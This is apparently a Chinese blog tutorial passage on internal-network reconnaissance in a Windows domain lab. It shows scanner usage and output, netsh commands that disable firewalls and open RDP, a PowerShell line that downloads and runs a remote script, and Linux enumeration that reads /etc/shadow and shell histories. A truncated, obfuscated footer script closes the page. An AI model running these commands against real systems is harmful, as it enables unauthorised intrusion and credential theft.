<p><a href="https://download.elifulkerson.com/files/tcping/0.39/x64/" rel="nofollow" title="Index of /files/tcping/0.39/x64">Index of /files/tcping/0.39/x64</a></p> 
<p>使用：</p> 
<pre>C:\Users\de1ay.DE1AY\Desktop&gt;tcping64.exe -n 1 10.10.10.10 445

Probing 10.10.10.10:445/tcp - Port is open - time=1.913ms

Ping statistics for 10.10.10.10:445
1 probes sent.
1 successful, 0 failed.  (0.00% fail)
Approximate trip times in milli-seconds:
Minimum = 1.913ms, Maximum = 1.913ms, Average = 1.913ms

C:\Users\de1ay.DE1AY\Desktop&gt;tcping64.exe -n 1 10.10.10.10 441

Probing 10.10.10.10:441/tcp - No response - time=2009.850ms

Ping statistics for 10.10.10.10:441
1 probes sent.
0 successful, 1 failed.  (100.00% fail)
Was unable to connect, cannot provide trip statistics.

C:\Users\de1ay.DE1AY\Desktop&gt;tcping64.exe -n 1 10.10.10.201 445

Probing 10.10.10.201:445/tcp - Port is open - time=2.857ms

Ping statistics for 10.10.10.201:445
1 probes sent.
1 successful, 0 failed.  (0.00% fail)
Approximate trip times in milli-seconds:
Minimum = 2.857ms, Maximum = 2.857ms, Average = 2.857ms

C:\Users\de1ay.DE1AY\Desktop&gt;</pre> 
<h3 id="h2-21">十、cping</h3> 
<p>k8团队</p> 
<p>下载地址：</p> 
<p><a href="https://pan.wgpsec.org/public_open/4-%E5%90%8E%E6%B8%97%E9%80%8F%20&amp;%20%E5%9F%9F%E6%B8%97%E9%80%8F/%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0/cping3.0" rel="nofollow" title="https://pan.wgpsec.org/public_open/4-后渗透 &amp; 域渗透/主机发现/cping3.0">https://pan.wgpsec.org/public_open/4-后渗透 &amp; 域渗透/主机发现/cping3.0</a></p> 
<p>使用：</p> 
<p>下载解压后可以看到很多个 exe 文件，<a href="http://xn--ykqriq4eqqzf7713a.net/" rel="nofollow" title="其分别代表了.net">其分别代表了.net</a>编译版本，编译版本对应系统如下：</p> 
<pre>XP/2003(已淘汰,用户少,使用的大部分也会装.net,因为好多app需要连驱动都要.net,具体看安装版本一般2.0)

Vista       2.0(基本上也没多少用户)
Win7/2008   2.0 3.0 3.5
Win8/2012   4.0
Win8.1      4.0 4.5
Win10/2016  4.0 4.6 (4.5未测应该也行)</pre> 
<pre>C:\Users\de1ay.DE1AY\Desktop&gt;cping35.exe scan osver 10.10.10.1 10.10.10.255
Scan OS version
10.10.10.1---10.10.10.255

Segment: 10.10.10.0
=============================================
IP              MAC               HostName        OSver
10.10.10.10     00-0C-29-4E-20-BD DC.de1ay.com    [Win 2012 R2 Standard 9600]
10.10.10.80     00-0C-29-68-D3-69 WEB.de1ay.com   [Win 2008 R2 Standard 7601 SP
1]
10.10.10.201    00-0C-29-9E-7B-7A PC.de1ay.com    [Win 7 Ultimate 7601 SP 1]
=============================================
Count:3</pre> 
<h3 id="h2-22">十一、fscan</h3> 
<p>作者是影舞者大佬，内网大杀器</p> 
<p>下载地址：</p> 
<p><a href="https://github.com/shadow1ng/fscan" title="GitHub - shadow1ng/fscan: 一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。">GitHub - shadow1ng/fscan: 一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。</a></p> 
<p>使用：</p> 
<pre>C:\Users\de1ay.DE1AY\Desktop&gt;fscan64.exe -h 10.10.10.1-255 -p 22,445

___                              _
/ _ \     ___  ___ _ __ __ _  ___| | __
/ /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
fscan version: 1.8.1
start infoscan
已完成 0/0 listen ip4:icmp 0.0.0.0: socket: An attempt was made to access a sock
et in a way forbidden by its access permissions.
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 10.10.10.10     is alive
(icmp) Target 10.10.10.80     is alive
(icmp) Target 10.10.10.201    is alive
[*] Icmp alive hosts len is: 3
10.10.10.80:445 open
10.10.10.10:445 open
10.10.10.201:445 open
[*] alive ports len is: 3
start vulscan
[+] 10.10.10.80 MS17-010        (Windows Server 2008 R2 Standard 7601 Service Pa
ck 1)
[+] 10.10.10.10 MS17-010        (Windows Server 2012 R2 Standard 9600)
[+] 10.10.10.201        MS17-010        (Windows 7 Ultimate 7601 Service Pack 1)

已完成 3/3
[*] 扫描结束,耗时: 25.2090706s</pre> 
<p>不仅可以扫描端口，还可以进行漏洞扫描，存好扫描、弱口令测试等</p> 
<h3 id="h2-23">十二、nmap</h3> 
<p>懂得都懂</p> 
<pre>SYN 扫描：			nmap -sS -sn -sV -T4 192.168.7.0/24
ARP 扫描：			nmap -PR -sn 192.168.7.0/24
ICMP 扫描：		nmap ‐sP ‐PI 192.168.7.0/24 ‐T4
ICMP 扫描：		nmap ‐sn ‐PE ‐T4 192.168.7.0/24
SNMP 扫描：		nmap -sU --script snmp-brute 192.168.7.0/24 -T4
UDP 扫描：			nmap -sU -T5 -sV --max-retries 1 192.168.7.7 -p 500
NetBIOS 扫描：	nmap --script nbstat.nse -sU -p137 192.168.7.0/24 -T4
SMB 扫描：			nmap ‐sU ‐sS ‐‐script smb‐enum‐shares.nse ‐p 445 192.168.7.0/24</pre> 
<h3 id="h2-24">十三、MSF</h3> 
<p>存在很多端口扫描和存活扫描模块</p> 
<pre>auxiliary/scanner/discovery/udp_probe
auxiliary/scanner/discovery/udp_sweep
auxiliary/scanner/discovery/arp_sweep
auxiliary/scanner/netbios/nbname
auxiliary/scanner/snmp/snmp_enum
auxiliary/scanner/smb/smb_version
auxiliary/scanner/netbios/nbname</pre> 
<h3 id="h2-25">十四、netdiscover</h3> 
<p>kali自带，不能扫目标内网</p> 
<p>使用：</p> 
<pre>netdiscover -r 192.168.5.0/24</pre> 
<pre>Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                   

5 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 300                                                                                                                                 
_____________________________________________________________________________
IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
-----------------------------------------------------------------------------
192.168.5.1     00:50:56:c0:00:08      1      60  VMware, Inc.                                                                                                                                  
192.168.5.2     00:50:56:f8:00:0f      1      60  VMware, Inc.                                                                                                                                  
192.168.5.131   00:0c:29:68:d3:5f      2     120  VMware, Inc.                                                                                                                                  
192.168.5.254   00:50:56:e3:5a:e6      1      60  VMware, Inc.</pre> 
<h2>域内端口扫描</h2> 
<h3 id="h2-26">一、Telnet</h3> 
<p>如果想探测某台主机的某个端口是否开放，直接使用 telnet 命令是最方便的。</p> 
<h4 id="h3-57">端口开放状态</h4> 
<pre>telnet 10.10.10.80 80 #80端口开启状态</pre> 
<p>回显:</p> 
<pre>HTTP/1.1 400 Bad Request
Content-Type: text/html; charset=us-ascii
Server: Microsoft-HTTPAPI/2.0
Date: Tue, 28 Feb 2023 09:06:36 GMT
Connection: close
Content-Length: 326

&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/str
ict.dtd"&gt;
&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;Bad Request&lt;/TITLE&gt;
&lt;META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"&gt;&lt;/HEAD&gt;
&lt;BODY&gt;&lt;h2&gt;Bad Request - Invalid Verb&lt;/h2&gt;
&lt;hr&gt;&lt;p&gt;HTTP Error 400. The request verb is invalid.&lt;/p&gt;
&lt;/BODY&gt;&lt;/HTML&gt;</pre> 
<h4 id="h3-58">端口关闭状态</h4> 
<pre>telnet 10.10.10.80 81 #81端口关闭状态</pre> 
<p>回显：</p> 
<pre>PS C:\Users\mssql\Desktop\PowerSploit-3.0.0\Recon&gt; telnet 10.10.10.80 81
正在连接10.10.10.80...无法打开到主机的连接。 在端口 81: 连接失败</pre> 
<h3 id="h2-27">二、NC</h3> 
<p>瑞士军刀</p> 
<p>下载地址：</p> 
<p><a href="https://eternallybored.org/misc/netcat/" rel="nofollow" title="netcat 1.11 for Win32/Win64">netcat 1.11 for Win32/Win64</a></p> 
<p>会被杀软删除</p> 
<p>使用：</p> 
<pre>nc.exe -vv 192.168.7.7 3389</pre> 
<pre>C:\Users\mssql\Desktop&gt;nc.exe -vv 10.10.10.10 3389
DNS fwd/rev mismatch: DC != DC.de1ay.com
DC [10.10.10.10] 3389 (ms-wbt-server) open</pre> 
<p>拿来进行多个端口扫描也是可以的，就是扫描速度有点慢</p> 
<pre>nc.exe -rz -w 2 -vv 192.168.7.7 0-65535

-r 随机指定本地与远端主机的通信端口
-z 使用0输入/输出模式，只在扫描通信端口时使用
-w&lt;超时秒数&gt; 设置等待连线的时间</pre> 
<pre>C:\Users\daniel10&gt;nc.exe -rz -w 2 -vv 192.168.7.7 443-445
DNS fwd/rev mismatch: DC != DC.teamssix.com
DC [192.168.7.7] 444 (?): TIMEDOUT
DC [192.168.7.7] 443 (https): TIMEDOUT
DC [192.168.7.7] 445 (microsoft-ds) open
sent 0, rcvd 0</pre> 
<h3 id="h2-28">三、fscan</h3> 
<p>影舞者大佬写的一款工具</p> 
<p>使用：</p> 
<pre>PS C:\Users\de1ay.DE1AY\Desktop&gt; .\fscan.exe -h 10.10.10.10

___                              _
/ _ \     ___  ___ _ __ __ _  ___| | __
/ /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
fscan version: 1.8.1
start infoscan
(icmp) Target 10.10.10.10     is alive
[*] Icmp alive hosts len is: 1
10.10.10.10:88 open
10.10.10.10:445 open
10.10.10.10:139 open
10.10.10.10:135 open
[*] alive ports len is: 4
start vulscan
[+] NetInfo:
[*]10.10.10.10
[-&gt;]DC
[-&gt;]10.10.10.10
[*] 10.10.10.10    [+]DC DE1AY\DC                Windows Server 2012 R2 Standard 9600
[+] 10.10.10.10 MS17-010        (Windows Server 2012 R2 Standard 9600)
已完成 4/4</pre> 
<h3 id="h2-29">ScanLine</h3> 
<p>上面有介绍</p> 
<pre>scanline.exe -h -t 22,80,445,3389 -p 10.10.10.10</pre> 
<h3 id="h2-30">四、S扫描器</h3> 
<p>火绒会杀</p> 
<p>下载：</p> 
<p><a href="https://pan.baidu.com/s/1gdGM4F5" rel="nofollow" title="s扫描器.rar_免费高速下载|百度网盘-分享无限制">s扫描器.rar_免费高速下载|百度网盘-分享无限制</a></p> 
<p>使用：</p> 
<pre>C:\Users\de1ay.DE1AY\Desktop&gt;s.exe tcp 10.10.10.10 22,80,3389,445 7
TCP Port Scanner V1.1 By WinEggDrop

Normal Scan: About To Scan 4 Ports Using 7 Thread
10.10.10.10      3389  Open
10.10.10.10      445   Open
Scan 10.10.10.10 Complete In 0 Hours 0 Minutes 3 Seconds. Found 2 Open Ports</pre> 
<h3 id="h2-31">五、PowerShell</h3> 
<h4 id="h3-59">PowerSploit</h4> 
<p>PowerSploit的Invoke-Portscan 脚本</p> 
<p>下载地址：</p> 
<p><a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1" rel="nofollow" title="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1</a></p> 
<p>使用：</p> 
<p>无文件方式：</p> 
<pre>powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1');Invoke-Portscan -Hosts 10.10.10.10 -T 4 -ports '445,1433,80,8080,3389'"</pre> 
<p>我没有成功</p> 
<p>有文件</p> 
<pre>powershell.exe -exec bypass -Command "Import-Module ./Invoke-Portscan.ps1;Invoke-Portscan -Hosts 10.10.10.10 -T 4 -ports '445,1433,80,8080,3389'"</pre> 
<pre>C:\Users\de1ay.DE1AY\Desktop&gt;powershell.exe -exec bypass -Command "Import-Module
./Invoke-Portscan.ps1;Invoke-Portscan -Hosts 10.10.10.10 -T 4 -ports '445,1433,
80,8080,3389'"

Hostname      : 10.10.10.10
alive         : True
openPorts     : {445, 3389}
closedPorts   : {}
filteredPorts : {1433, 80, 8080}
finishTime    : 2023/2/28 17:24:12</pre> 
<h4 id="h3-60">nishang</h4> 
<p>这里用的只是众多脚本中的一个</p> 
<p>下载：</p> 
<p><a href="https://raw.githubusercontent.com/samratashok/nishang/0090ba2e51b7503c3245081894c0fc87b696f941/Scan/Invoke-PortScan.ps1" rel="nofollow" title="https://raw.githubusercontent.com/samratashok/nishang/0090ba2e51b7503c3245081894c0fc87b696f941/Scan/Invoke-PortScan.ps1">https://raw.githubusercontent.com/samratashok/nishang/0090ba2e51b7503c3245081894c0fc87b696f941/Scan/Invoke-PortScan.ps1</a></p> 
<p>使用：</p> 
<pre>PS C:\Users\de1ay.DE1AY\Desktop&gt; Import-Module .\nishang.ps1
PS C:\Users\de1ay.DE1AY\Desktop&gt; Invoke-PortScan -StartAddress 10.10.10.10 -EndA
ddress 10.10.10.10 -ScanPort -Port 80,443,445

IPAddress                  HostName                   Ports
---------                  --------                   -----
10.10.10.10                                           {445}</pre> 
<h3 id="h2-32">六、MSF</h3> 
<p>懂得都懂</p> 
<pre>auxiliary/scanner/portscan/ack          TCP ACK端口扫描
auxiliary/scanner/portscan/ftpbounce    FTP bounce端口扫描
auxiliary/scanner/portscan/syn         	SYN端口扫描
auxiliary/scanner/portscan/tcp          TCP端口扫描  
auxiliary/scanner/portscan/xmas         TCP XMas端口扫描</pre> 
<p>在扫描内网时不要忘记添加路由</p> 
<h3 id="h2-33">七、nmap</h3> 
<p>一般情况下目标机器是不会有nmap的，需要自己上传，用法都是一样的</p> 
<h2>防火墙</h2> 
<p>有时候需要反弹端口或者连接3389和防火墙放行</p> 
<h3 id="h2-34">开启关闭</h3> 
<pre>netsh firewall show state                      // 防火墙状态
netsh firewall show config                     // 查看防火墙配置
netsh firewall set opmode disable              // 关闭防火墙（windows server 2003及以前）
netsh advfirewall set allprofiles state off    // 关闭防火墙（windows server 2003以后）</pre> 
<h3 id="h2-35">修改防火墙配置</h3> 
<pre>netsh firewall add allowedprogram c:\\xxx\\xx.exe "allow xx" enable    // 允许指定程序的全部连接（windows server 2003及以前）

windows server 2003之后：
netsh advfirewall firewall add rule name="pass xx" dir=in action=allow  program="C:\xxx\xx.exe"         // 允许某个程序连入
netsh advfirewall firewall add rule name="pass xx" dir=out action=allow program="C:\xxx\xx.exe"               // 允许某个程序外连
netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow        // 开启3389端口，允许改端口放行</pre> 
<h3 id="h2-36">开启远程桌面连接</h3> 
<pre>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f

REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</pre> 
<h2>PowerShell信息收集</h2> 
<h3 id="h2-37">PowerView</h3> 
<p>PowerView是一款依赖于PowerShell和WMI对内网进行查询的渗透测试脚本，集成在PowerSploit工具包中，这里使用PowerView</p> 
<p>下载地址:</p> 
<p><a href="https://github.com/PowerShellMafia/PowerSploit" title="GitHub - PowerShellMafia/PowerSploit: PowerSploit - A PowerShell Post-Exploitation Framework">GitHub - PowerShellMafia/PowerSploit: PowerSploit - A PowerShell Post-Exploitation Framework</a></p> 
<p>使用:</p> 
<p>在powershell中我没有使用成功，在cmd里可以</p> 
<pre>C:\Users\mssql\Desktop\PowerSploit-3.0.0\Recon&gt; powershell.exe -exec bypass -
Command "&amp; {Import-Module .\PowerView.ps1;Get-NetDomain}"

Forest                  : de1ay.com
DomainControllers       : {DC.de1ay.com}
Children                : {}
DomainMode              :
Parent                  :
PdcRoleOwner            : DC.de1ay.com
RidRoleOwner            : DC.de1ay.com
InfrastructureRoleOwner : DC.de1ay.com
Name                    : de1ay.com</pre> 
<p>常用参数:</p> 
<pre>Get-NetDomain：获取当前用户所在域的名称；
Get-NetUser：获取所有用户信息；
Get-NetDomainController：获取所有域控制器信息；
Get-NetComputer：获取域内所有机器的详细信息；
Get-NetOU：获取域中OU信息；
Get-NetGroup：获取所有域内组合组成员信息；
Get-NetFileServer：根据SPN获取当前域使用的文件服务器信息；
Get-NetShare：获取当前域内所有的网络共享信息；
Get-NetSession：获取指定服务器的会话；
Get-NetRDPSession：获取指定服务器的远程连接；
Get-NetProcess：获取远程主机的进程；
Get-UserProcess：获取指定用户的日志；
Get-ADObject：获取活动目录的对象；
Get-NetGPO：获取域内所有的组策略对象；
Get-DomainPolicy：获取域默认策略或域控制器策略；
Invoke-UserHunter：获取域用户登录的计算机信息和该用户是否有本地管理员权限；
Invoke-ProcessHunter：通过查询域内所有的机器进程找到特定用户；
Invoke-UserEventHunter：根据用户日志查询某域用户登录过哪些域机器；</pre> 
<h2>Linux信息收集</h2> 
<h3 id="h2-38">操作系统&amp;内核版本-环境变量</h3> 
<pre>&gt;cat /etc/issue
&gt;cat /etc/*-release
&gt;cat /etc/lsb-release
&gt;cat /etc/redhat-release
cat /proc/version
&gt;uname -a
&gt;uname -mrs
&gt;rpm -q kernel
&gt;dmesg | grep Linux
&gt;ls /boot | grep vmlinuz-
&gt;cat /etc/profile
&gt;cat /etc/bashrc
&gt;cat ~/.bash_profile
&gt;cat ~/.bashrc
&gt;cat ~/.bash_logout
&gt;env
&gt;set
Root权限进程
&gt;ps aux | grep root
&gt;ps -ef | grep root
计划任务
&gt;crontab -l
&gt;ls -alh /var/spool/cron
&gt;ls -al /etc/ | grep cron
&gt;ls -al /etc/cron*
&gt;cat /etc/cron*
&gt;cat /etc/at.allow
&gt;cat /etc/at.deny
&gt;cat /etc/cron.allow
&gt;cat /etc/cron.deny
&gt;cat /etc/crontab
&gt;cat /etc/anacrontab
&gt;cat /var/spool/cron/crontabs/root
IP信息
&gt;/sbin/ifconfig -a
&gt;cat /etc/network/interfaces
&gt;cat /etc/sysconfig/network
连接信息
&gt;grep 80 /etc/services
&gt;netstat -antup
&gt;netstat -antpx
&gt;netstat -tulpn
&gt;chkconfig --list
&gt;chkconfig --list | grep 3:on
&gt;last
&gt;w
用户信息
&gt;id
&gt;whomi
&gt;w
&gt;last
&gt;cat /etc/passwd
&gt;cat /etc/group
&gt;cat /etc/shadow
&gt;ls -alh /var/mail/
&gt;grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # 列出超级用户
&gt;awk -F: '($3 == "0") {print}' /etc/passwd   #列出超级用户
&gt;cat /etc/sudoers
&gt;sudo –l
操作记录
&gt;cat ~/.bash_history
&gt;cat ~/.nano_history
&gt;cat ~/.atftp_history
&gt;cat ~/.mysql_history
&gt;cat ~/.php_history
可写目录
&gt;find / -writable -type d 2&gt;/dev/null      # 可写目录
&gt;find / -perm -222 -type d 2&gt;/dev/null     # 可写目录 
&gt;find / -perm -o w -type d 2&gt;/dev/null     # 可写目录
&gt;find / -perm -o x -type d 2&gt;/dev/null     # 可执行目录
&gt;find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null   # 可写可执行目录</pre> 
<h2>临时HTTP搭建</h2> 
<pre>&gt;python2 -m SimpleHTTPServer 
&gt;python3 -m http.server 8080
&gt;php -S 0.0.0.0:8888
&gt;openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
&gt;openssl s_server -key key.pem -cert cert.pem -accept 443 –WWW
&gt;ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port =&gt; 8888,:DocumentRoot =&gt; Dir.pwd).start"
&gt;ruby -run -e httpd . -p 8888</pre>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/b239afca4e61a146537ccd53cba767d4/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">Python保留指定位数的小数【5种方法】</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/712ca901a3130c262021fb633df85859/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">TypeError: Cannot read properties of null (reading ‘parentNode‘) vue3踩坑</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in 